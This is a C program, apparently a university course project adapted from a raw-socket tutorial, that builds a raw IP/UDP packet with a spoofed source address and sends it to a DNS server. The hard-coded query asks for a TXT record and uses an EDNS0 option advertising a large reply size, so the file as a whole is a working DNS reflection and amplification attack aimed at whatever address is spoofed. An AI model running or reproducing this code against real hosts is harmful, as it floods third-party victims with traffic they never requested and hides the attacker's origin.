
/*
        MODIFIED BY DANIEL WEBB FOR CSE 425 PROJECT 1 - A53504306
	Raw UDP sockets, 
	source: https://www.binarytides.com/raw-udp-sockets-c-linux/
*/
#include<stdio.h>	//for printf
#include<string.h> //memset
#include<sys/socket.h>	//for socket ofcourse
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in.h>
#include <arpa/inet.h>
/* 
	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

/*
	Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main(int argc, char *argv[])
{
	//Create a raw socket of type IPPROTO
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (argc<3) {
		perror("Please specify the IP address being spoofed and DNS server's IP address.");
		exit(0);
	} else {
		printf("%s\n",argv[1]);
		printf("%s\n",argv[2]);
	}
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(0);
	}
	
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32] , *data , *pseudogram;
	
	//zero out the packet buffer
	memset (datagram, 0, 4096);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	/*Please put your DNS query message here*/
	char dns_query_msg[] = { 0x00 ,0x00 ,0x01 ,0x01 ,0x00 ,0x01 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x01 ,  0x05 ,0x71 ,0x75 ,0x65 ,0x72 ,0x79 ,0x0a ,0x64 ,0x61 ,0x6e ,0x69 ,0x65 ,0x6c ,0x77 ,0x65 ,0x62
,0x62 ,0x02 ,0x69 ,0x6f ,0x00 ,0x00
   ,0x10 ,0x00 ,0xff, 0x00 ,0x00 ,0x29 ,0x50 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00
};
         

	//Data part
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	//strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	memcpy(data, dns_query_msg, sizeof(dns_query_msg));
	
	//some address resolution
	//strcpy(source_ip , "192.168.1.2");
	memcpy(source_ip , argv[1], strlen(argv[1]));
	
	sin.sin_family = AF_INET;
	//sin.sin_port = htons(80);

	
	sin.sin_addr.s_addr = inet_addr (argv[2]); //DNS server's IP address
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof(dns_query_msg);
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
	//UDP header
	udph->source = htons (6666); /*UDP source port*/
	udph->dest = htons (53); /*UDP destination port, 53 is for DNS service*/
	udph->len = htons(8 + sizeof(dns_query_msg));	//tcp header size
	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
	
	//Now the UDP checksum using the pseudo header
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + sizeof(dns_query_msg) );
	
	
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(dns_query_msg);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(dns_query_msg));
	
	udph->check = csum( (unsigned short*) pseudogram , psize);
	

	//Send the packet
	if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
	{
		perror("sendto failed");
	}
	//Data send successfully
	else
	{
		printf ("Packet Send. Length : %d \n" , iph->tot_len);
	}	
	return 0;
}

//Complete
